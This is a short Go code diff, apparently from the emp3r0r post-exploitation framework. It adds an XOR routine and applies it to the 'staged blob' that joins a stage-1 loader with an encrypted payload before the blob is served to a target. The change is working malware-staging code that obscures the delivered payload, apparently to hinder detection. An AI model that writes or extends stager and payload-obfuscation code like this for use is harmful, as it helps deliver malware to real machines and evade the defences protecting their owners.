@@ -10,6 +10,15 @@ import (
 
 const stage1LoaderEnv = "EMP3R0R_STAGE1_LOADER"
 
+func xorData(data []byte, key []byte) {
+	if len(key) == 0 {
+		return
+	}
+	for i := range data {
+		data[i] ^= key[i%len(key)]
+	}
+}
+
 func resolveStage1LoaderPath() string {
 	if p := os.Getenv(stage1LoaderEnv); p != "" {
 		return p
@@ -66,6 +75,7 @@ func buildServedBlob(payloadPath string, keyStr string, compression bool) ([]byt
 	blob := make([]byte, 0, len(loader)+len(encryptedPayload))
 	blob = append(blob, loader...)
 	blob = append(blob, encryptedPayload...)
+	xorData(blob, key)
 	logging.Infof("Serving staged blob: loader=%d bytes payload=%d bytes total=%d bytes",
 		len(loader), len(encryptedPayload), len(blob))
 	return blob, nil
